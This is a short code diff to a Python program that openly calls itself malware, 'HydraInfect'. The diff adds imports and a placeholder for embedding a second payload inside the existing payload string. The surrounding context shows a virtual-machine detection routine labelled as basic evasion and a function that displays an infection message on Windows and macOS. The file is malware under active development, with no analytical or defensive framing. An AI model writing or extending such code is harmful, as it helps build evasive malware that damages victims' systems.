@@ -9,6 +9,18 @@ import subprocess
 import stat
 
 payload = b"""
+import os
+import platform
+import ctypes
+import shutil
+import random
+import requests
+import time
+import subprocess
+import stat
+
+payload = b"In the future figure out how to embed another payload in here"
+
 # 1. Environment Detection (Basic Evasion)
 def is_virtual_environment():
     if platform.system() == "Linux":
@@ -123,7 +135,7 @@ def is_virtual_environment():
 def display_message():
     os_type = platform.system()
     if os_type == "Windows":
-        ctypes.windll.user32.MessageBoxW(0, "You've been infected by HydraInfect!", "Malware Alert", 1)
+        ctypes.windll.user32.MessageBoxW(0, "Youve been infected by HydraInfect!", "Malware Alert", 1)
     elif os_type == "Darwin":  # macOS
         try:
             subprocess.run(['osascript', '-e', 'display dialog "You\'ve been infected by HydraInfect!"'])
